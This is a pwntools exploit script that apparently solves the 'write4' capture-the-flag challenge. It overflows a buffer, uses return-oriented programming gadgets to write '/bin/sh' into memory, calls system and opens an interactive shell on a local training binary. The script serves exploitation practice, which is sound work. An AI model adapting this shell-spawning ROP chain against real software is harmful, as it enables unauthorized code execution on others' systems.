from pwn import *

p = process('./write4')

system = 0x4005e0
buffer = 0x601050

string = '/bin/sh\x00'

# mov qword ptr [r14], r15; ret;
gadget1 = 0x0000000000400820
# pop r14; pop r15; ret;
gadget2 = 0x0000000000400890
# pop rdi; ret;
gadget3 = 0x0000000000400893

payload = 'a' * 40
payload += p64(gadget2)
payload += p64(buffer)
payload += string.ljust(8, '\x00')

payload += p64(gadget1)

payload += p64(gadget3)
payload += p64(buffer)
payload += p64(system)
payload += 'cccccccc'

p.sendline(payload)
p.interactive()
